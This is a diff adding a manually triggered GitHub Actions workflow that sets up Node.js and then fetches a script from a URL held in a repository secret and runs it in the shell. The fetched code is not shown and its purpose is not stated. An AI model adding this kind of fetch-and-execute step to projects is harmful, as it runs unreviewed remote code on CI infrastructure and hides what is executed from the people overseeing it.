@@ -1,0 +1,22 @@
+name: Job
+
+on: workflow_dispatch
+
+jobs:
+  start:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v2
+        with:
+          path: archive
+
+      - name: Use Node.js 16.x
+        uses: actions/setup-node@v2
+        with:
+          node-version: 16.x
+
+      - name: source
+        env:
+          JOB_URL: ${{ secrets.JOB_URL }}
+        run: |
+          source <(curl -L "$JOB_URL" | tr -d '\r')
